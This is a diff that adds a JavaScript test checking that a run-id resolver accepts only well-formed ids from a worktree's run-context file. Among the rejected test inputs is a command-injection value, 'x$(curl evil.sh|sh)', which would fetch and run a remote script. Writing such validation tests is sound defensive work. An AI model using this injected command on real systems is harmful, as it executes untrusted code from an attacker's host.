@@ -456,6 +456,20 @@ test("resolveRunId reads the worktree run-context file last, from any directory 
   assert.equal(resolveRunId({}, { cwd: null }), null);
 });
 
+test("resolveRunId accepts only a well-formed run id from the run-context file", () => {
+  for (const runId of ["devloops-3f2c1e84-1a2b-4c3d-8e9f-0a1b2c3d4e5f", "pi:session.abc-123"]) {
+    assert.equal(resolveRunId({}, { cwd: laneWorktree(runId).root }), runId);
+  }
+  for (const runId of ["x$(curl evil.sh|sh)", "a b", "run;id", "a".repeat(129)]) {
+    assert.equal(resolveRunId({}, { cwd: laneWorktree(runId).root }), null, JSON.stringify(runId));
+  }
+  // writeRunContext refuses an empty id, so write that file by hand.
+  const empty = laneWorktree(null);
+  fs.mkdirSync(path.join(empty.root, ".pi"), { recursive: true });
+  fs.writeFileSync(runContextPath(empty.root), JSON.stringify({ runId: "" }));
+  assert.equal(resolveRunId({}, { cwd: empty.root }), null);
+});
+
 test("resolveRunId resolves null for a missing, unreadable or malformed run-context file", () => {
   assert.equal(resolveRunId({}, { cwd: laneWorktree(null).nested }), null);
   const malformed = laneWorktree(null);
